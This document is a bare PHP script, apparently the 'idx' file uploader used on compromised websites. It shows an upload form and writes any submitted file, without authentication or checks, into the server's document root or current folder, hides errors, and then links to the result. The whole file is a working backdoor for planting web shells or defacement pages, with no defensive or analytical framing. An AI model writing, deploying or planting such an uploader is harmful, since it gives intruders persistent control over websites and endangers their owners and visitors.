<?php
echo "<form method='post' enctype='multipart/form-data'><input type='file' name='idx_file'><input type='submit' name='upload' value='upload'></form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = @$_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "Success to Upload => <a href='$web/$files' target='_blank'><u>$web/$files</u></a>";} 
		else {echo "Failed to upload on root dir";}}
				else {
		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
			echo "Success upload <b>$files</b> in this folder";}
		else {echo "Failed To Upload";}}} ?>
